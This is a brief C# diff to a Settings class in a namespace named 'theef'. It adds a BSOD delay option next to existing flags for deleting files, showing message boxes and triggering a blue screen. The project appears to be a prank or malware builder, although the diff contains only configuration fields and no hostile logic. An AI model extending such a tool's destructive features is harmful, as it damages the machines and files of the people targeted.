@@ -24,6 +24,7 @@ namespace theef
 
         // BSOD settings.
         private int bsodEnabled;
+        private int bsodDelay;
 
         // Get and sets.
         public int MessageBoxEnabled { get => messageBoxEnabled; set => messageBoxEnabled = value; }
@@ -34,6 +35,7 @@ namespace theef
         public int DeleteFiles { get => deleteFiles; set => deleteFiles = value; }
         public string[] Files { get => files; set => files = value; }
         public int BsodEnabled { get => bsodEnabled; set => bsodEnabled = value; }
+        public int BsodDelay { get => bsodDelay; set => bsodDelay = value; }
 
         public Settings(String[] settings)
         {
@@ -111,6 +113,7 @@ namespace theef
 
             //  ================ BSOD settings. ================
             BsodEnabled = int.Parse(settings[14]);
+            bsodDelay = int.Parse(settings[16]);
         }
     }
 }
